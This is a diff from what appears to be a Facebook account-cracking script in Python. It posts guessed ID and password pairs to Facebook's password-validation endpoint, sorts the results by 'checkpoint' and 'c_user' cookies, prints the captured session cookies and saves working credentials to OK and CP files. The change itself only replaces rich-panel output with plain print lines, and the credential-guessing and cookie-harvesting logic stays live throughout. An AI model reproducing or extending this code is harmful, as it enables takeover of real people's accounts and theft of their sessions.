@@ -1103,21 +1103,14 @@ def _async(idf,pwv):
 			}
             post = ses.post(f"https://free.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=wibu_head,allow_redirects=False)
             if "checkpoint" in ses.cookies.get_dict().keys():
-                tree = Tree(Panel.fit(f"[yellow] LOGIN CHECKPOINT ",style=f"white"))
-                tree.add(Panel.fit(f"[yellow] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[yellow] {tahun(idf)} ",style=f"white"))
-                tree.add(Panel.fit(f"[yellow]{ua}",style=f"white"))
-                prints(tree)
+                print(f' {P}[{K} CP{P}] {K}{idf}|{pw}')
                 open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                 cp+=1
                 break	
             elif "c_user" in ses.cookies.get_dict().keys():
                 ok+=1
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                tree = Tree(Panel.fit(f"[green] LOGIN SUCKSES ",style=f"white"))
-                tree.add(Panel.fit(f"[green] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[green] {tahun(idf)} ",style=f"white"))
-                tree.add(Panel.fit(f"[green]{kuki}",style=f"white"))
-                tree.add(Panel.fit(f"[green]{ua}",style=f"white"))
-                prints(tree)
+                print(f' {P}[{H} OK{P}] {H}{idf}|{pw}\n{kuki}')
                 open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                 break
             else:continue
